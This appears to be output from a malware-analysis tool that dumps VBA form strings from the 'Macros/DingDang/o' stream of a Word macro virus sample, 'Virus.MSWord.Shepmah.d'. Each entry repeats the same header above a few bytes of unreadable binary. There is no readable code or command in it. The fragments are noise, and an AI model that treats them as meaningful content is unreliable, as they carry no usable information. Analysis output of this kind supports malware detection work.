-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��6�R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���I>�+��-�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�BF~3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
v��� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M��%��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��,-!:��@�1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
KaPC�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x��dS��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��&�I��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�D24Su�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��pY�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G`��HH�
q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����|@!�'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q�4��9D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�pL��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�X$�p3��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j�#�pd.A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ఋ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�[E"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A]�@.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*���p��G
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��L�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��6A\0�/��-3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���t�4�T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p3�D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���RP1s|�) P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�NO"*A�L�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�� H�h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
UA���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Pr>��_��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��%Z�,Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(D3`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R�>S0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%�	��6�y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(D�pJ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�g�!(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i8�p	�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��hA�j�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��e�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@�
c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\�gr��\z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
۰?�@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s?��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k�Rk�S��V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u7u�o��u?�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
QZ��S;-��;����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��:��Z��z������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
P
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ʩ�8a.��	��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� �@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��v�0ڰ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Pg�:�\*2�`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^�	��
��h��?��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@kVd@V���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e�q���Zi{6F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t0	��?G�h�J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�i��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�zc8�S/�g�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t5Xw��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t?��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i�T#��Q{:�U!cU�w��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=ٳC�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���k{���枕�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�jţx��,N�b�ck0D�N&C�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7�C�4�1 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�gc]%�*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��vʑ�3DH�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��`��`1�C�A��c=�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z��M�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Q��

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�b�j�BNt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��:��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��`i�F��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(h����>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j+C�)z� s�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w&2��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ɫ>'�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`p��t�Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{k�{JS\1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��<�a�g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� 	�����Ҡ`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p��&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;��0"v
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r��c�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ѕ���a��Z��X8�0�d��J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� �R��F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�`7�4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`)+�k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ZGH}��(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7�!���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����QN��-�Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�)uiH�o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��yl�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ʛ&�"n\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�i��J+!�6qT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z�t��)��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��� `rGm�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J�`���Z�Ő���D���D�dR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��`y�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�A�7q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�CZy�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�T�ccs��0�ї
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!`��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0p
��KP�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r�d}6�ô�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����w9�!�<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I�S}�ƏP
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4J9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K: ��
0�6�D��\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��4�qБ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�! G��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�u����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8e'�L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ؔ4!>CL
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}��,��zg�0�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$[�@�Qp
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Gɲ� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"�E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��	�1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�#/²
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R60�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*��S.Q�>с�2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ǥ"]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(O�XO�`6��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o0nQ%(�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�$jQ�u�j�3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Shepmah.d' - OLE stream: 'Macros/DingDang/o'
